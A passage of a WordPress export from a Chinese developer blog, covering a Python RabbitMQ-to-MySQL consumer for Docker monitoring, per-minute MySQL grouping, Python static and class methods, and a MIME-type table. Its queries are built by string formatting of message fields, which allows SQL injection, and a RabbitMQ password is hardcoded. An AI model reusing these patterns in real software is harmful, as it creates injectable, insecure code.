 self.child = os.fork()
 if self.child == 0:
 return
 else:
 self.watch()
 def watch(self):
 try:
 os.wait()
 except KeyboardInterrupt:
 self.kill()
 sys.exit()
 def kill(self):
 try:
 os.kill(self.child, signal.SIGKILL)
 except OSError:
 pass
def main(thread_id):
 try:
 credentials = pika.PlainCredentials(Config.RABBIT_USER, Config.RABBIT_PASSWD)
 connection = pika.BlockingConnection(pika.ConnectionParameters(Config.RABBIT_HOST,Config.RABBIT_PORT,Config.RABBIT_VHOST,credentials))
 channel = connection.channel()
 channel.queue_declare(queue='saveData')
 except:
 print 'RabbitMQ Conneciton FAIL'
 sys.exit()
 def callback(ch, method, properties, body):
 msg = json.loads(body)
 if msg['control_type'] == 'containerState':
 sql = "INSERT INTO container_state(container_id,Cpu_percent,Memory_usage,Memory_limit,Memory_percent,Collect_time,rx_packets,tx_packets,rx_bytes,tx_bytes,rx_dropped,tx_dropped,rx_errors,tx_errors,rx_speed,tx_speed) VALUES('%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s');" % (msg['container_id'],msg['Cpu_percent'],msg['Memory_usage'],msg['Memory_limit'],msg['Memory_percent'],msg['Collect_time'],msg['rx_packets'],msg['tx_packets'],msg['rx_bytes'],msg['tx_bytes'],msg['rx_dropped'],msg['tx_dropped'],msg['rx_errors'],msg['tx_errors'],msg['rx_speed'],msg['tx_speed'])
 elif msg['control_type'] == 'containerInfo':
 pass
 elif msg['control_type'] == 'imageInfo':
 pass
 elif msg['control_type'] == 'networkInfo':
 pass
 MySQLControl().insert(sql)
 ch.stop_consuming()
 ch.basic_ack(delivery_tag=method.delivery_tag)
 channel.basic_consume(callback, queue='saveData',no_ack=False)
 channel.start_consuming()
 channel.stop_consuming()
 connection.close()
def get_queue_size():
 credentials = pika.PlainCredentials('dockerm', '123456')
 connection = pika.BlockingConnection(pika.ConnectionParameters('127.0.0.1', 5672, "dockerm_vhost", credentials))
 channel = connection.channel()
 result = channel.queue_declare(queue='saveData')
 return result.method.message_count
if __name__ == "__main__":
 Watcher()
 while 1:
 queue_size = get_queue_size()
 if queue_size &gt; 10:
 thread_num = 5
 else:
 thread_num = 2
 if queue_size &gt; 0:
 t = []
 for i in range(thread_num):
 t.append(threading.Thread(target=main, args=(i,)))
 t[i].setDaemon(True)
 t[i].start()
 for x in t:
 x.join()</pre>

<code>get_queue_size</code> 函数获取队列长度，判断应该开多少线程（简单粗暴，目前来说还够用）。最高峰同时启动五个线程。这个脚本运行之后，每当我处理信息，Rabbit MQ CPU负载可以突破 150% ，脚本负载达到 50% ，这负载明显过分了，但我逛遍整个百度和谷歌，都非常少关于 Python 操作 Rabbit MQ 的资料，我一时间也不清楚如何解决。
我在想是不是我频繁地连接断开导致占用过高，我把 <code>channel.stop_consuming()</code> 这段代码去掉之后，Rabbit MQ 和 脚本的占用率皆降到 3% 不到。
...其实我应该不要用 <code>pika</code> 来搞多线程消费，迟点看看 <code>rabbitpy</code> 。
...以后有需要继续更]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1586</wp:post_id>
		<wp:post_date><![CDATA[2016-11-09 17:25:45]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-11-09 09:25:45]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[python%e8%bf%9e%e6%8e%a5%e3%80%81%e6%93%8d%e4%bd%9crabbit-mq%e9%98%9f%e5%88%97]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="python"><![CDATA[Python]]></category>
		<category domain="post_tag" nicename="python"><![CDATA[python]]></category>
		<category domain="category" nicename="rabbit-mq"><![CDATA[Rabbit MQ]]></category>
		<category domain="post_tag" nicename="rabbit-mq"><![CDATA[Rabbit MQ]]></category>
		<category domain="post_tag" nicename="%e9%98%9f%e5%88%97"><![CDATA[队列]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[91]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_yoast_wpseo_content_score]]></wp:meta_key>
		<wp:meta_value><![CDATA[60]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_yoast_wpseo_primary_category]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>MySQL 根据 datatime 获取每隔分钟一条信息</title>
		<link>https://www.nervgeek.com/2016/11/14/mysql-%e6%a0%b9%e6%8d%ae-datatime-%e8%8e%b7%e5%8f%96%e6%af%8f%e9%9a%94%e5%88%86%e9%92%9f%e4%b8%80%e6%9d%a1%e4%bf%a1%e6%81%af/</link>
		<pubDate>Mon, 14 Nov 2016 14:44:45 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1592</guid>
		<description></description>
		<content:encoded><![CDATA[目前做的 Docker 监控脚本，用的是自带 docker-api 每秒获取一次各容器占用信息，在脚本里设置了每十秒写入一次数据库，但网页的 Chart 显示也是十秒间距，那要看 最近六小时 或者 半天的信息，需要获取 （6<em>60</em>5）=1800 条数据，不仅查询慢，而且还密密麻麻，显示相当不友好。
从脚本那边设置每六十秒获取一次感觉对管理员或者想知道比较详细的状态的人来说，一分钟容器可以千变万化，容易错过信息（虽然警报功能设计的状态警报是每秒判断，占用过高可以发出警报），所以只能对 SQL 语句下手脚了。
这是 SQL ：

<pre>def getContainerState(self, container_id, limit=720):
    result = self.select(("SELECT id,container_id,cpu_percent,memory_usage,memory_limit,memory_percent,tx_packets,tx_bytes,tx_dropped,tx_errors,tx_speed,rx_packets,rx_bytes,rx_dropped,rx_errors,rx_speed,UNIX_TIMESTAMP(collect_time) AS collect_time FROM container_state WHERE container_id='{}' GROUP BY UNIX_TIMESTAMP(collect_time)-UNIX_TIMESTAMP(collect_time) % 60 ORDER BY collect_time DESC LIMIT 0,{};").format(container_id,limit))
    return result</pre>

UNIX_TIMESTAMP(collect_time) AS collect_time：这个是我把标准时间转换为时间戳，因为 Chart 那边是用时间戳。
GROUP BY UNIX_TIMESTAMP(collect_time)-UNIX_TIMESTAMP(collect_time) % 60：对查询的结果按每分钟分组。
结果截图：
<a href="https://www.nervgeek.com/wp-content/uploads/2016/11/IYP43IZXKP0JPVBEW.png"><img class="alignnone size-full wp-image-1593" src="https://www.nervgeek.com/wp-content/uploads/2016/11/IYP43IZXKP0JPVBEW.png" alt="iyp43izxkp0jpvbew" width="2110" height="1309" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/11/TY5GMDOT5LE8_V@I.png"><img class="alignnone size-full wp-image-1594" src="https://www.nervgeek.com/wp-content/uploads/2016/11/TY5GMDOT5LE8_V@I.png" alt="ty5gmdot5le8_vi" width="2110" height="1309" /></a>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1592</wp:post_id>
		<wp:post_date><![CDATA[2016-11-14 22:44:45]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-11-14 14:44:45]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[mysql-%e6%a0%b9%e6%8d%ae-datatime-%e8%8e%b7%e5%8f%96%e6%af%8f%e9%9a%94%e5%88%86%e9%92%9f%e4%b8%80%e6%9d%a1%e4%bf%a1%e6%81%af]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="mysql"><![CDATA[MySQL]]></category>
		<category domain="category" nicename="%e6%95%b0%e6%8d%ae%e5%ba%93"><![CDATA[数据库]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[87]]></wp:meta_value>
		</wp:postmeta>
							<wp:comment>
			<wp:comment_id>36</wp:comment_id>
			<wp:comment_author><![CDATA[🐶]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[123@qq.com]]></wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[122.190.2.48]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2018-01-11 14:47:44]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2018-01-11 06:47:44]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[草泥马]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[]]></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
						<wp:commentmeta>
	<wp:meta_key><![CDATA[akismet_result]]></wp:meta_key>
			<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
						<wp:commentmeta>
	<wp:meta_key><![CDATA[akismet_history]]></wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
			</wp:commentmeta>
						<wp:commentmeta>
	<wp:meta_key><![CDATA[akismet_history]]></wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
			</wp:commentmeta>
							</wp:comment>
					</item>
					<item>
		<title>Python 中的 @staticmethod 和 @classmethod</title>
		<link>https://www.nervgeek.com/2016/11/16/python-%e4%b8%ad%e7%9a%84-staticmethod-%e5%92%8c-classmethod/</link>
		<pubDate>Wed, 16 Nov 2016 13:07:30 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1609</guid>
		<description></description>
		<content:encoded><![CDATA[<pre>class Method():
    var1 = 'hello'
    def __init__(self, var2 = "object var"):
        self.var2 = 'var2'
    def show(self):
        print self.var2
    @staticmethod
    def staticFunc():
        print 'static method'
    @classmethod
    def classFunc(cls):
        print cls.var1
        print 'class method'</pre>

<span style="font-size: 14pt;">staticmethod和classmethod的相同点:</span>
<span style="font-size: 14pt;">1.都可以通过类或实例调用</span>

<pre>mt = Method()
Method.staticFunc()
mt.staticFun()
Method.classFunc()
mt.classFun()</pre>

<span style="font-size: 14pt;">2.都无法访问 <strong>实例</strong> 成员</span>

<pre>@staticmethod
def staticFunc():
    print <wbr />var2 <wbr /> <wbr />//wrong 
<wbr />
@classmethod
def classFunc(cls):
    print var2 <wbr /> //wrong</pre>

<span style="font-size: 14pt;"> </span>staticmethod和classmethod的区别:
<span style="font-size: 14pt;">1.staticmethod无需参数，classmethod需要类变量作为参数传递（不是类的实例）</span>

<pre>def classFunc(cls):
    print 'class method' <wbr /> //cls作为类变量传递</pre>

<span style="font-size: 14pt;">2.classmethod可以访问 <strong>类</strong> 成员，staticmethod则不可以</span>

<pre>@staticmethod
def staticFunc():
    print <wbr />var1 <wbr /> <wbr />//wrong <wbr />
@classmethod
def classFunc(cls):
    print cls.var1 <wbr /> //right</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1609</wp:post_id>
		<wp:post_date><![CDATA[2016-11-16 21:07:30]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-11-16 13:07:30]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[python-%e4%b8%ad%e7%9a%84-staticmethod-%e5%92%8c-classmethod]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="classmethod"><![CDATA[@classmethod]]></category>
		<category domain="post_tag" nicename="staticmethod"><![CDATA[@staticmethod]]></category>
		<category domain="category" nicename="python"><![CDATA[Python]]></category>
		<category domain="post_tag" nicename="python"><![CDATA[python]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[107]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>MIME Types 大全</title>
		<link>https://www.nervgeek.com/2016/12/06/mime-types-%e5%a4%a7%e5%85%a8/</link>
		<pubDate>Tue, 06 Dec 2016 11:45:59 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1634</guid>
		<description></description>
		<content:encoded><![CDATA[<table class="alignleft" border="1" cellspacing="0" cellpadding="0">
<thead align="left">
<tr>
<th id="d8073e47" class=""><span style="font-size: 14pt;">Suffixes applicable</span></th>
<th id="d8073e50" class=""><span style="font-size: 14pt;">Media type and subtype(s)</span></th>
</tr>
</thead>
<tbody>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.3dm</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">x-world/x-3dmf</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.3dmf</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">x-world/x-3dmf</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.a</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/octet-stream</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.aab</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-authorware-bin</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.aam</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-authorware-map</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.aas</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-authorware-seg</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.abc</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/vnd.abc</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.acgi</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/html</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.afl</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">video/animaflex</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.ai</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/postscript</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.aif</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/aiff</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.aif</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/x-aiff</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.aifc</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/aiff</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.aifc</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/x-aiff</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.aiff</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/aiff</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.aiff</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/x-aiff</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.aim</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-aim</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.aip</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/x-audiosoft-intra</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.ani</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-navi-animation</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.aos</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-nokia-9000-communicator-add-on-software</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.aps</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/mime</span></td>
</tr>
<!--more-->
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.arc</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/octet-stream</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.arj</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/arj</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.arj</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/octet-stream</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.art</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/x-jg</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.asf</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">video/x-ms-asf</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.asm</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/x-asm</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.asp</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/asp</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.asx</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-mplayer2</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.asx</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">video/x-ms-asf</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.asx</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">video/x-ms-asf-plugin</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.au</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/basic</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.au</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/x-au</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.avi</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-troff-msvideo</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.avi</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">video/avi</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.avi</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">video/msvideo</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.avi</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">video/x-msvideo</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.avs</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">video/avs-video</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.bcpio</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-bcpio</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.bin</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/mac-binary</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.bin</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/macbinary</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.bin</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/octet-stream</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.bin</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-binary</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.bin</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-macbinary</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.bm</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/bmp</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.bmp</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/bmp</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.bmp</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/x-windows-bmp</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.boo</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/book</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.book</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/book</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.boz</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-bzip2</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.bsh</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-bsh</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.bz</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-bzip</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.bz2</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-bzip2</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.c</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/plain</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.c</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/x-c</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.c++</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/plain</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.cat</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/vnd.ms-pki.seccat</span></td>
</tr>
<tr>
